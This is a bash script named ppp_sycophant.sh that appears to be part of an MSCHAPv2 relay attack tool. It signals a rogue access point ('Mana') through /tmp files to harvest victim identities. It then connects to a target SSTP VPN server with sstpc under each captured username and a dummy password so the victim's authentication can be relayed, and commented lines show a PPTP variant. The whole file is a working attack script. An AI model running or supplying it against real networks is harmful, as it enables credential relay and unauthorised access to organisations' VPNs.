#!/bin/bash

if (( $EUID != 0 )); then
    echo "SYCOPHANT : Please run as root"
    exit
fi

supplicant="sstpc"

target=''

print_usage(){ 
    printf "Usage: sudo ./ppp_sycophant.sh -t <target>\n" 
}

# PPTP TUNNEL:
# pptpsetup --create my_tunnel --server $target --username $username --password IDONTCARE
# pon my_tunnel debug dump logfd 2 nodetach
# ------
# SSTP TUNNEL
# $supplicant  --log-stderr --cert-warn --user $username --password IDONTCARE --log-level 3 $target usepeerdns require-mschap-v2 noauth noipdefault defaultroute refuse-eap debug logfd 2
# ------

while getopts 't:h' flag; do
  case "${flag}" in
    t) target="${OPTARG}" ;;
    h) print_usage
       exit 1 ;;
    *) print_usage
       exit 1 ;;
  esac
done

clean_up(){
    rm /tmp/SYCOPHANT_P1ID
    rm /tmp/SYCOPHANT_P2ID
    rm /tmp/CHALLENGE
    rm /tmp/CHALLENGE_LOCK
    rm /tmp/RESPONSE
    rm /tmp/RESPONSE_LOCK 
    rm /tmp/SYCOPHANT_STATE
    rm /tmp/VALIDATE
    return
}

exit_time(){
    printf "\n"
    printf "SYCOPHANT : Cleaning Up State\n"
    clean_up &>/dev/null
    printf "SYCOPHANT : Stopping dhcpcd\n"
    # dhclient -x -r $interface
    printf "SYCOPHANT : Exiting\n" 
    kill 0
}

# ERR is triggered if rm file doesnt exist.
# trap "exit" INT TERM ERR
trap "exit" INT TERM
trap "exit_time" EXIT

clean_up &>/dev/null

printf "SYCOPHANT : Target set to ${target}\n"
printf "SYCOPHANT : Instructing Mana to get Identities\n"
echo -n "I" > /tmp/SYCOPHANT_STATE

printf "SYCOPHANT : Waiting for Identity\n"
while true
do
    if [[ -s /tmp/SYCOPHANT_P1ID ]]; then
        if [[ -s /tmp/SYCOPHANT_P2ID ]]; then
            username=$(cat /tmp/SYCOPHANT_P2ID)
            printf "SYCOPHANT : RUNNING \"$sstpc  --log-stderr --cert-warn --user $username --password IDONTCARE --log-level 3 ${target} usepeerdns require-mschap-v2 noauth noipdefault defaultroute refuse-eap  debug logfd 2\"\n"
            $supplicant  --log-stderr --cert-warn --user $username --password IDONTCARE --log-level 3 $target usepeerdns require-mschap-v2 noauth noipdefault defaultroute refuse-eap debug logfd 2
            break
        fi
    fi
    sleep 0.3
done
# printf "SYCOPHANT : RUNNING \"dhclient $interface\"\n"
# dhclient $interface 

wait
